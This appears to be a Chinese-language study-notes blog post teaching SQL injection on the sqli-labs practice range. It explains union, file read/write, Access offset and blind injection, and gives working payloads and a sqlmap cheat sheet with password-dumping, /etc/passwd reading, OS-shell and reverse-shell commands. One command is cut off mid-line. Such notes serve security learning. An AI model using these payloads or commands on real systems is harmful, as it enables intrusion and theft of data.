![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/96676310c842f93ce92217184ac3c5fd.png)

### 简要介绍

#### sql注入的原理：

大部分网站都要与数据库产生交互，sql语言是一种用于处理数据库的语言，通过sql语言设计的服务器网站传入用户的输入数据时一般是通过参数传递，网站服务器进而通过传入的参数来去数据库查询对应的数据，而sql注入就是将sql代码掺到用户的输入参数中进入传递给服务器，服务器在收到参数对其处理时便会对其中的代码进行执行进而实现攻击者的操作【Sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。】

如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。当使用sql服务器执行与操作系统交互命令时，该进程将与执行命令的组件（如数据库服务器、应用服务器或web服务器）拥有相同的权限，这种权限的级别通常很高。如果攻击者执行以上恶意代码的插入操作成功，那么用户数据库服务器或者整个应用会遭到破坏，甚至被控制。 

#### sql注入漏洞产生的条件

1.**即目标语句有可更改变量**，要注入的目标sql语句必须有变量，如果目标sql语句没有变量，那么它也就不需要传入参数来查询变量对应的值，因此也就无法通过sql注入修改参数这一方法进行攻击

2.**有输入语句**，要注入的目标sql语句即使有变量也必须还得有输入语句，很简单，人家编程时没有输入语句，虽然要执行的sql语句有一个变量，但是人家没说让你传入参数决定变量的值，即没有要求传入参数的语句，因此仍然无法通过修改传入参数进行sql注入

---------------------1，2总的来说就是要求目标sql语句有你可控的变量-----------------------------------------------------

3.**有执行语句（带入数据库查询）**，目标sql语句在后续必须要有执行语句，你通过输入语句更改参数来改变可控变量后，人家也必须要有去执行这个语句的执行语句啊，不然改了但是人家不执行还是白干

-------可控变量和带入数据库查询缺一不可---------------------------------

4**.更改后的变量或参数没有被过滤**，即目标的防御措施没有生效，对方有可能会对传入的参数或执行语句时的变量进行审查（过滤），如果被发现了那就gg了，就得通过它检测语句不严谨的地方来进行绕过

#### 如何判断注入点？

判断页面是否有注入点实质上就是看你能不能给页面传入更改后的参数，所以所有的方法实质都是对照一下看你改参数后和改参数前或连续更改参数前后页面是否因为收到你改的参数而做出反应（比如你随便输入了一堆乱七八糟人家数据库根本没有的参数，如果页面报错那肯定就是说人家收到你的参数并且查询了，那么就是有注入点，即符合sql注入漏洞产生的条件）

最直接的方法就是and 1=1正常,and 1=2错误说明存在诸如点

其他方法：[(6条消息) sql注入_sql注入语句and1=1 '1=1_Lyyhun的博客-CSDN博客](https://blog.csdn.net/qq_63267612/article/details/123936752)（讲解有哪些测试方法）

- 原理？[注入漏洞_为啥在SQL注入漏洞时，通过后面加and 1=1 或1=2就可以判断是不是存在漏洞。 (cha138.com)](https://it.cha138.com/php/show-3179185.html)
- 如果更改参数后网站自动跳转或报404错，那么就说明人家对传入参数的有检测

#### sql注入实例

​    [注入漏洞_为啥在SQL注入漏洞时，通过后面加and 1=1 或1=2就可以判断是不是存在漏    洞。 (cha138.com)](https://it.cha138.com/php/show-3179185.html)

#### 靶场使用

phpstudy的sqli-labs-masters

## MYSQL注入

![](C:\Users\19746\Desktop\网络安全\图片\屏幕截图 2023-05-26 200107.png)

### 信息收集

- 操作系统：先得知对方数据库的操作系统，linux是区分大小写的，window不区分大小写，确定了操作系统才能保证后续操作时不会在大小写上出现问题
- 用sql注入获取信息的方式：SQL注入的方式[网站SQL注入之数字型注入和字符型注入 - 星拾夜暝 - 博客园 (cnblogs.com)](https://www.cnblogs.com/mo3408/p/16211525.html)
- 数据库用户：用户权限决定是否采用高权限注入方式。如果你在该网页拿到的用户名是普通用户A，那么说明负责该网站的就是普通用户A，则你拿到的是低权限，只能通过常规查询查看该用户负责的部分数据库，但如果你拿到的是root用户，由于root用户管理所有的数据库，那么你拿到的就是高权限，可以跨越当前网站的数据库查看该网站所有的数据库

### MYSQL数据库

#### MYSQL数据库的结构：

MYSQL数据库包括多个数据库，每个数据库对应一个网站，每个数据库下又包含多个表名，每个表名下包含多个列名，每个列对应一个数据（**一一对应**）

-------

MYSQL数据库 ：

​           数据库A=网站A=数据库用户A

​                     表名

​                            列名

​                            数据（一个数据里面可能有多个小数据）

​            数据库B=网站B=数据库用户B

​                                     同上

​             数据库C=网站C=数据库用户C

​                                     同上

------

cmd命令行中，`show databases` 用于查看MYSQL数据库下的所有数据库名

cmd命令行中，`use 数据库名` 用于选中数据库，`show tables` 用于显示表名

cmd命令行中，`select * from 表名`用于查询列名和对应的数据(把*改为列名，在写上对应的表明用于查询该列名对应的数据)

[(6条消息) MySQL系列-MySQL体系结构_龙空白白的博客-CSDN博客](https://blog.csdn.net/weixin_42094855/article/details/125207426)

#### MYSQL数据库的符号含义

1.在数据库中，符号”."的含义是下一级，如xiaodi.user的意思就是xiaodi数据库下的user表名

#### MYSQL数据库高版本的有据查询

MYSQL在5.0以上的版本中存在一个自带的数据库，名字为**information_schema**，它存储这所有的数据库名，表名，列名及数据，因此我们可以通过以它为根据对目标信息进行有据查询

**infortmatio_schema：记录所有数据库名，表名，列名对应表的表**

**information_schema.schemata:记录所有数据库名的表**

**information_schema.tables：记录所有表名的信息的表**

**information_schema.columns:记录所有列名的信息的表**

**table_name:表名**

**column_name:列名**

**table_schema:数据库名**

#### 低版本暴力查询或结合读取查询：

用工具字典或到网上自己找常见的表名列名自己爆破尝试

读取一些文件来获取信息

### 常规查询

#### 常规查询方式1：union联合注入

##### union联合注入原理 

[(6条消息) sql注入(Union注入攻击)_mssql union注入_darkfive的博客-CSDN博客](https://blog.csdn.net/m0_65463546/article/details/128234690)

原理：首先了解网站在用户打开后显示结果的整个过程：用户点开页面（相当于打开一个数据库），页面传入参数给数据库，数据库对传入的参数进行数据库查询（查询表名，查询列名，查询数据）处理后把结果用于sql语句的拼接，然后服务器对sql语句进行执行，这些sql语句有些有输出语句（回显），有些没有，网站会显示回显的sql语句执行的结果。

- order by可以查询数据库列名数量的原理：[使用order by排序判断返回结果的列数，order by排序判断字段数原理详解-阿里云开发者社区 (aliyun.com)](https://developer.aliyun.com/article/849211#:~:text=使用 「联合注入」（SQL注入漏洞的利用方式之一）进行脱库的时候，需要判断页面显示的 「字段」数量，也就是返回的查询结果包含几个字段，最常用的一种判断方式就是利用,order by 排序判断字段数。)

union注入的原理就是通过sql的语法（如union,order by等）先判断传入的参数在查询时用到了几个列名（SELECT语句）【SELECT语句用于从表名中选取列名，由于列名与数据一一对应，所以又可以被认为是从表名中选取数据】（用到order by),然后将这些SELECT语句通过union语法与自己编辑的新SELECT语句合并（前面的SELET语句就是网站的参数，select+数字是用于测试第几列（即第几个位置）是回显的）【如果前后SELECT语句用到的列数相等，union语句会将前后语句的结果合并】，再使前面的SELET语句为假（即使参数结果为假），此时网站由于参数错误就会显示union后面的语句，再判断出哪几个新写的语句是回显的，最后把这写回显的新写语句改为自己想执行的函数就可以获取函数执行后的结果了       

[(6条消息) sql语句中union的用法_sql union_小月亮6的博客-CSDN博客](https://blog.csdn.net/weixin_42383680/article/details/119858753)

##### union联合注入操作步骤

==1.判断是否存在注入点==

==2.判断注入点类型==

==3.使用order by x 判断该页面url的传参所给的sql语句查询了几个列名==

==4.用union select 数字 测试回显注入点（由于网站页面的回显位置有限，union语句会优先回显前面语句，所以要使union前面的语句【即参数】报错才会显示后面的语句）==

==5.把对应的回显注入点的测试数字换成想要执行的函数进行信息收集：==

​                  **数据库版本：version()**

​                  **数据库名字：database()**

​                  **数据库用户：user()**

​                  **操作系统：@@version_compile_os**

==6.查询==

- 注意：一些网站对传入的参数进行组装sql语句时会做出一些特定的要求（比如sqli第一关会对传入的参数查询时做出limit限制【limit函数用于限制查询范围】），此时如果我们想要得到相应的数据需要绕开限制，可以用--+【在sql语法中--和#表示后续语句为注释语句，不执行，#在url中为动作标识符，无法正常使用给数据库，因此采用--；+会被数据库识别成空格，用于避免--后面紧跟其他符号导致转义】来让数据库忽视后续要求

  [(9条消息) mysql的limit函数_Mysql中很赞的函数LIMIT_汪汪汪汪妄想症的博客-CSDN博客](https://blog.csdn.net/weixin_33389398/article/details/113339190)

  **查询指定数据库下的表名**：

​    url?id=(参数，要求报错) union select 1,`group_concat(table_name)`【表名】,3,4 from `information_schema.tables` 【记录所有表名信息的表】where     `table_schema`【数据库名】='查询到的数据库名'

字符型注入：

?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+

- group_concat(xxx)：

是将分组中括号里对应的字符串进行连接.如果分组中括号里的参数xxx有多行，那么就会将这多行的字符串连接，每个字符串之间会有特定的符号进行分隔。

简单理解就是group_concat(xxx)是为了让回显的数据显示完整

**在所有的数据库中的列名查询列名信息：**

​       url?id=(参数，要求报错) union select 1,`group_concat(column_name)`,3,4 from `information_schema.columns` where `table_name`='查询到的表名'

- 在指定的数据库查询列名信息

#这种查询方式是在所有数据库中的所有表名中查询，如果不同表名下有相同名字的列名，那么它就会可能查成全部或者差错，获取不到我们目标表下的列名，这时我们就需要在后面加上后置条件`and table_name='目标所在的表名'`

**查询当前数据库的指定数据**:

url?id=(参数，要求报错) union select 1,`group_concat(password)`[查询到的列名]，3,4 from 对应的表名

- 如果是跨库查询，就要把对应的表名改为`对应的数据库名.对应的表名`

#查询到的数据可能有多行，即一条数据分为多条小数据，这时如果我们想要看特定一行的数据或看全部的数据就需要加上后置条件**limit x,1**

猜解多个数据采用limit x,1 变动猜解，即把x从0开始一一递增直到不显示数据【limit 0,1 意思为从第一行加载一条记录】

### 跨库查询：

- 要求用户为高权限（root)

1.查询所有数据库名:

url?id=(参数，要求报错) union select 1,`group_concat(schema_name)`,3 from `information_schema.schemata`

2.找到要跨的数据库名

3.获取指定数据库下的表名

4.......（后续操作同union联合注入步骤相同）

### 文件读写

在确定sql注入漏洞后，我们可以利用下面的几个函数对文件内容进行读写操作

#### 使用函数：

load_file()        读取文件函数

CMD:select load_file(‘文件绝对路径’)；【斜杠要用/，避免电脑识别出换行符错误】

URL：1，load_file(路径)，2【如果出问题可能时被电脑把/识别为转义，则斜杠用//表示真/】

into outfile                写入文件函数

CMD：select '写入内容' into outfile '文件路径'

URL： 1，'x'，3 into outfile '路径'[/t同上]--+

into dumpfile          导出文件函数

[MySQL注入 利用系统读、写文件 - Mysticbinary - 博客园 (cnblogs.com)](https://www.cnblogs.com/mysticbinary/archive/2021/02/14/14403017.html)

- 三者都为MYSQL数据库特有函数

#### 路径获取常见方式：

报错显示：网站报错时会泄露路径（扫描工具/手动探测）

遗留文件（eg:查看网站phpinfo.php(扫描工具可以扫到)）

漏洞报错（知道网站是用什么cms或者框架进行搭建的，用搜索引擎去找到对应的爆路径方式，比如phpcms 爆路径）

平台配置文件：结合前面的读取文件操作来读取搭建网站平台的配置文件，通过[默认路径](https://blog.csdn.net/weixin_30292843/article/details/99381669)去尝试找到突破口，但如果更改了默认安装路径，也是很难进行（**不怎么常用**）

爆破：运用一些常见固定的可能安装位置生成字典，对目标网站进行爆破

......

#### 魔术引号

php内置的安全放于机制常见的有魔术引号过滤机制，magic_quotes_gpc

魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，对单引号、双引号、反斜线、NULL加上一个一个反斜线进行转义

说白了就是网站为了防止恶意传参，对',",\等符号前面加上\来让你原本的符号转变含义，这样子系统就无法识别路径就避免了恶意传参

- 绕过方式：采用hex(16进制)编码绕过因为对路径进行编码之后魔术引号不会再对其生效也就是说绕过了魔术引号的作用达到绕过。【把路径换成16进制编码】【宽字节绕过】

### 常见防御手段

- 自带防御：魔术引号
- 内置函数：is函数,addslashes()[和魔术引号作用相同]

is函数：在编码时，网站收到参数后用`is_数据类型`函数判断传入的参数是否符合要求从而进行过滤（eg:is_int对传入的参数判断是否为数字整型数据类型，这就使直接传入路径的参数被过滤掉。

这种基本绕过不了

- 自定义关键字过滤：比如他们编码时对关键字select进行过滤，用replace函数把传入的参数里全部的关键字select换成别的词
- waf防护软件：安全狗，宝塔等【基本都采取关键字过滤或内置函数过滤两种方式】

## 提交方法和数据类型

### 数据类型

网站的参数有不同的数据类型，不同数据类型在注入参数时可能需要加上不同的符号，因此在判断出注入点后我们需要用各种方式判断符号进而去判断数据类型

数字型，字符型，搜索型，JSON等

数字型sql语句：select * from 【】 where id = 参数

字符型sql语句：select * from 【】where 变量 = ‘参数’

搜索型sql语句：select * from 【】where name like '%参数%'（%的作用和linux系统搜索时通配符*的作用相同，这句话的意思时从【】中搜索所有名字后面有参数或名字前面有参数或名字中间有参数的目标）

- json是一个键值对集合的数据类型，因此我们在上传json类的参数时就需要按照键值对json的格式来上传参数

eg:`json = {"username":"Dumb' and 1=2 union select 1,database(),3#"}`就把username这个键的值上传参数为语句Dumb' and 1=2 union select 1,database(),3#

- 在url中#不能被成功传递，要用#的url编码：%23

- 判断不同数据类型的方法：

1，数字型和字符型：[(9条消息) sql数字型 字符型注入的区别_数字型注入和字符型注入的区别_踮起脚尖。的博客-CSDN博客](https://blog.csdn.net/weixin_43749051/article/details/114294051)

### 请求方法

网站在上传参数时根据需求会采用不同的请求方法，比如上传文件时，几kb的小文件上传时就用GET方式，更大的文件就需要采用别的方式。不同参数的请求方法可能不同，这就要求我们要按照不同请求方法来用不同方式去注入参数

- 注意：修改参数不一定只能在url上修改，post等方法对应的参数不能在url上接收，在url上传参的效果实际上等同于抓包后修改对应的数据包，所以传参的方法一般是抓包后按照不同的请求方法分别修改要传入的参数值
- 只要是有信息上传的地方就会产生注入漏洞

GET,POST,REQUEST，SERVER

- get数据包修改注入参数时要把空格改为+

- post中--+要换成--空格或#

（有时遇到网站采用post过滤方式时【即对post方式传入的参数进行过滤】，我们可以尝试用cookie方式提交)

- 如何cookie注入？

在网站提交数据后抓包并在数据包上加上`cookie:数据`即可

REQUEST方法：可以接收任何请求方法的参数，即用request可以传入任何请求方法对应的参数

GET方法的特性：只要在url对GET对应的参数传参，哪怕提交方法不是GET，GET就可以接收到对应的参数值

[请求方式的基本含义 - 百度文库 (baidu.com)](https://wenku.baidu.com/view/eb81486e753231126edb6f1aff00bed5b9f373e4.html?_wkts_=1685363194555&bdQuery=网站请求方式是干嘛的%3F)

[PHP 超级全局变量 | 菜鸟教程 (runoob.com)](https://www.runoob.com/php/php-superglobals.html)

## 其它数据库注入

![](C:\Users\19746\Desktop\网络安全\图片\屏幕截图 2023-05-31 101001.png)

(通用数据库注入思路，除access注入)

- 常见数据库类型:Access,mysql,mssql(又叫sqlserve),mongoDB,postgresql,sqlite,oracle,sybase等

### 各种数据库特点：

access:                                                                            mysql,mssql等其它数据库：

​    access                                                                                               mysql

​                 表名                                                                                                 数据库名

​                            列名                                                                                                  表名

​                                     数据                                                                                                   列名

​                                                                                                                                                     数据

【access本身就是数据库名的一种，Access数据库保存在网站源码下面，每个网页都对应一个access数据库，相互独立。所以就无法进行跨库注入等依靠其他库来注入目标库的操作】

### 判断网站数据库类型方法：

1.根据网站url目录文件脚本的后缀判断（比如219.153.49.228:49079/new_list.asp?id=1,这里new.list文件脚本的后缀是asp，则该网页一般对应的数据库就是Accessm,可以去网上搜不同后缀对应的数据库）

2.使用工具判断数据库类型（eg：sqlmap)

3.网络上有判断不同数据库的url语句，可以一个一个爆破尝试

### Access注入

（大体步骤和MYSQL注入的常规查询1一致，但是由于access没有数据库名，因此不需要查询数据库名，数据库版本等，同时他也没有information表，因此想要得到数据就只能暴力破解，即猜表名列名【eg：id=1 union select 1,2,3 from admin就是猜测表名admin，如果有该表名，则会显示出数字）

[Access手工注入详解 - 简书 (jianshu.com)](https://www.jianshu.com/p/c1ebccc72486)

- 联合查询法：

1.判断出是access数据库类型

2.判断注入点以及参数类型和提交方式

3.使用`order by x` 语句确定列名数目

4.在语句的最后加上`from 表名` 猜解尝试爆破出表名{一般可以有admin}

5.把回显的测试数字换成猜解尝试爆破的列名【admin,password】

6.爆出数据（可能是加密后的，记得解密）

- 逐字猜解法：【特别麻烦】

​     看网站去，麻烦死了

- 如果猜不出表名列名怎么办？

1.查看登录框源代码的表单值或观察URL特征等针对性猜解

2.Access偏移注入：解决列名猜解不到的情况：

   [access偏移注入原理 - 浅易深 - 博客园 (cnblogs.com)](https://www.cnblogs.com/02S   WD/p/15811580.html)

​    1.order by 猜解当前网站返回结果的列数【假如是6条，那么此时语句是1 and order    by 1,2,3,4,5,6】

​    2.用*代替最后的数字然后逐渐往前删除数字直到页面返回正常【`1 and order by    1,2,3,4,5,*`页面错误，`1 and order by 1,2,3,4,*`页面错误，`1 and ordr by 1,2,3,*`页面正常】{说明此时的`*`代表一个表名，而这个表名有3列}

​    3.再把原来的数字减掉`*`代表的列名数的个数【eg:假如`*`代表6，原本是order by 1,2,3....,16,`*`.那么将其变成 order by 1,2,3,...,9,10`,*`】

4.语句后面加上 from (表名 as a inner join 表名 as b on a.id = b.id)【此时网站会随机爆出一些数据，然后看脸，如果不爆，那就二级偏移】

### sql server注入/mssql

[(9条消息) SQL注入-基于MSsql(sql server)的注入_sql server注入_一句话木马的博客-CSDN博客](https://blog.csdn.net/LJH1999ZN/article/details/122911809)

[MSSQL注入 - 珍惜少年时 - 博客园 (cnblogs.com)](https://www.cnblogs.com/xishaonian/p/6173644.html)

- 写入失败的原因？

1.防护软件

2.权限问题

3.所使用的工具问题

- 知识点

1.sysobjects为mssql的特有数据库

- 不是说要懂所有数据库的注入语句的语法，通过mysql语句语法的学习你了解了原理，其它数据库就是同样的道理，到时你再到网上搜索对应的语句直接复制粘贴就行，不一定要懂你复制粘贴的语句的语法

- 想看工具的注入语句，把工具的端口和抓包工具配置好，用工具注入时抓包看语句就好了

### mongDB注入

首先必须知道的是，在别的数据库中查询数据用的是where语句，而mongDB不同，他采用了键值对的方式查询数据，即输入参数“键'',查询到数据值，nosql工具【只能安装到linux系统上】支持mongDB数据库，sqlmap不支持

### 工具sqlmap的使用：

[1. sqlmap超详细笔记+思维导图 - bmjoker - 博客园 (cnblogs.com)](https://www.cnblogs.com/bmjoker/p/9326258.html)

#### 基本操作笔记

-u  #注入点 
-f  #指纹判别数据库类型 
-b  #获取数据库版本信息 
-p  #指定可测试的参数(?page=1&id=2 -p "page,id") 
-D ""  #指定数据库名 
-T ""  #指定表名 
-C ""  #指定字段 
-s ""  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s "xx.log"　　恢复:-s "xx.log" --resume) 
--level=(1-5) #要执行的测试水平等级，默认为1 
--risk=(0-3)  #测试执行的风险等级，默认为1 
--time-sec=(2,5) #延迟响应，默认为5 
--data #通过POST发送数据 
--columns        #列出字段 
--current-user   #获取当前用户名称 
--current-db     #获取当前数据库名称 
--users          #列数据库所有用户 
--passwords      #数据库用户所有密码 
--privileges     #查看用户权限(--privileges -U root) 
-U               #指定数据库用户 
--dbs            #列出所有数据库 
--tables -D ""   #列出指定数据库中的表 
--columns -T "user" -D "mysql"      #列出mysql数据库中的user表的所有字段 
--dump-all            #列出所有数据库所有表 
--exclude-sysdbs      #只列出用户自己新建的数据库和表 
--dump -T "" -D "" -C ""   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) 
--dump -T "" -D "" --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 
--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) 
--os      #指定系统(Linux,Windows) 
-v  #详细的等级(0-6) 
    0：只显示Python的回溯，错误和关键消息。 
    1：显示信息和警告消息。 
    2：显示调试消息。 
    3：有效载荷注入。 
    4：显示HTTP请求。 
    5：显示HTTP响应头。 
    6：显示HTTP响应页面的内容 
--privileges  #查看权限 
--is-dba      #是否是数据库管理员 
--roles       #枚举数据库用户角色 
--udf-inject  #导入用户自定义函数（获取系统权限） 
--union-check  #是否支持union 注入 
--union-cols #union 查询表记录 
--union-test #union 语句测试 
--union-use  #采用union 注入 
--union-tech orderby #union配合order by 
--data "" #POST方式提交数据(--data "page=1&id=2") 
--cookie "用;号分开"      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) 
--referer ""     #使用referer欺骗(--referer "http://www.baidu.com") 
--user-agent ""  #自定义user-agent 
--proxy "http://127.0.0.1:8118" #代理注入 
--string=""    #指定关键词,字符串匹配. 
--threads 　　  #采用多线程(--threads 3) 
--sql-shell    #执行指定sql命令 
--sql-query    #执行指定的sql语句(--sql-query "SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" ) 
--file-read    #读取指定文件 
--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) 
--file-dest    #要写入的文件绝对路径 
--os-cmd=id    #执行系统命令 
--os-shell     #系统交互shell 
--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) 
--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) 
--os-smbrelay  # 
--os-bof       # 
--reg-read     #读取win系统注册表 
--priv-esc     # 
--time-sec=    #延迟设置 默认--time-sec=5 为5秒 
-p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"  #指定user-agent注入 
--eta          #盲注 
/pentest/database/sqlmap/txt/
common-columns.txt　　字段字典　　　 
common-outputs.txt 
common-tables.txt      表字典 
keywords.txt 
oracle-default-passwords.txt 
user-agents.txt 
wordlist.txt 

常用语句 :
1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 
2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 
3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 
4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C "user,pass"  -v 1 --exclude-sysdbs 
5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 
6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read "c:\boot.ini" -v 2 
7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 
8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd "id" -v 1 
9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 
10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 
11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 
12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 
13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key="HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1 
14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 
15./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"
16./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"
17./sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
18./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 
19./sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1 
20./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner 
21./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --cookie="PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low" --string='xx' --dbs --level=3 -p "uid"

简单的注入流程 :
1.读取数据库版本，当前用户，当前数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
2.判断当前数据库用户权限 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
3.读取所有数据库用户或指定数据库用户的密码 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
4.获取所有数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 
5.获取指定数据库中的所有表 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 
6.获取指定数据库名中指定表的字段 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 
7.获取指定数据库名中指定表中指定字段的数据 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C "username,password" -s "sqlnmapdb.log" -v 2 
8.file-read读取web文件 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read "/etc/passwd" -v 2 
9.file-write写入文件到web 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：

!(C:\Users\19746\Desktop\markdown笔记\图片\信息收集.png)

## 查询方式及报错盲注

很多网站的SQL语句执行查询时因为方式不同都无回显，这导致我们SQL注入时无回显

### SQL语句的查询方式：

根据不同sql语句查询方式所对应的功能不同，再结合当前目标网页的功能判断处当前网页采用的SQL语句查询方式，进而去规范注入格式

#### select 查询数据：

在网站进行数据显示查询操作

eg:     select * from news where id=$id                在news这个表里查询数据id值为$id的列的数据

#### insert 插入数据：

在网站应用进行用户注册添加等操作

eg:      insert into news(id,url,text) values(2,'x','$t')    在news这个表里的id,url,text三个列里面分别插入2，‘x','$t'三个数据

#### delete 删除数据：

后台管理中删除文章，删除用户等操作

eg:      delete from news where id=$id                删除news表中id值为$id的列中的数据

#### update 更新数据:

会员或后台中心数据同步或缓存等操作

eg:        update user set pwd='$p' where id=2 and username='admin'       更新admin用户的密码

#### order by 排序数据：

一般结合表名或列名进行数据排序操作

eg:       select * from news order by $id

​            select id,name,price from news order by $order	

### 盲注：

盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。

盲注分为3种方法：基于布尔的逻辑判断，基于时间的延时判断，基于报错的报错回显。

[(9条消息) （16）【SQL盲注】基础函数、报错回显、延时判断、逻辑判断盲注_盲注判断字段数量_黑色地带(崛起)的博客-CSDN博客](https://blog.csdn.net/qq_53079406/article/details/123124994)

#### 基于时间的SQL盲注-延时判断（最后）

用if语句结合sleep语句，if语句的格式是if（条件，条件真返回值，条件假返回值），但是光if语句执行，由于sql语句无回显【SQL语句无回显不是不查询数据，只是主机查询数据后回馈给服务器但不回显到网页上】，无论返回的是多少我们都看不见，这时就需要用到sleep语句，sleep语句的格式是sleep(该语句执行的延时值)，在无回显的sql语句中执行该语句虽然没有回显值，但是由于执行了该语句，sql语句执行后查询数据回馈给数据库的时间会变，即页面返回的时间会变，。那么此时我们sleep(if(条件，条件真返回值，条件假返回值))，在条件上加上我们想要判断的语句【比如(length(database()))=10，可以判断数据库名的长度是否为10；又比如ascii(substr(database(),1,1))=107，可以判断数据库名的第一个字是否为'r'等等】，再分别设置好条件真a与条件假的值b，那么此时如果我们想要判断的条件是真的,if语句会返回a,sleep(a)语句会使网页页面返回时间为a；如果条件是假，那么网页返回时间是b。我们最终通过网页的返回时间判断自己输入的条件真假，多组判断后最终组合得到信息。

- 注意，网页的返回时间同时还受到网络等因素影响，因此不建议使用这种方法或使用时需要多次判断时间进行对比进而得出较为准确的结论
- mid(a,b,c)         从字符串a的b位置开始往后截取第c位的字符
- substr(a,b,c)       从字符串a的b位置开始往后截取长度为c的字符串

[(9条消息) 【SQL注入-无回显】时间盲注：原理、函数、利用过程_sql时间盲注_黑色地带(崛起)的博客-CSDN博客](https://blog.csdn.net/qq_53079406/article/details/125096394?ops_request_misc=&request_id=&biz_id=102&utm_term=延时盲注的原理&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-125096394.142^v88^control_2,239^v2^insert_chatgpt&spm=1018.2226.3001.4187)

- 遇到多个表名多个列名猜解时需要注释你要猜解第几行的（eg:select * from users where id = 1 and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) = 101,sleep(3),0)

  就是查询infromation_schema.tables数据库中的第一行表名的第一个字母【limit 0,1的意思是从0开始选取1行】

#### 基于布尔的SQL盲注-逻辑判断（其次）

[(9条消息) 布尔盲注怎么用，一看你就明白了。布尔盲注原理+步骤+实战教程_士别三日wyx的博客-CSDN博客](https://blog.csdn.net/wangyuxiang946/article/details/123486880)

一些网站在执行SQL语句后不回显数据，如果输入错误数据那么页面最终就会错误，正确数据页面会正常反应，即网站在接受数据后只会回馈两种反应，真和假，此时就是要用逻辑判断

逻辑思路和延时判断一样，只不过延时判断时通过时间判断，而逻辑判断是基于网页的真假结果判断

- left函数，left(字符串，n)，返回字符串从左边开始长度为n的字符串

#### 基于报错的SQL盲注-报错回显（优先）

[(9条消息) 报错注入是什么？一看你就明白了。报错注入原理+步骤+实战案例_士别三日wyx的博客-CSDN博客](https://blog.csdn.net/wangyuxiang946/article/details/123416521)

[12种报错注入+万能语句 - 简书 (jianshu.com)](https://www.jianshu.com/p/bc35f8dd4f7c)

语句中的0x..一般是一种标识符，方便报错回显时便于找到目标

## 二次，加解密，DNS注入，堆叠注入

### 加解密

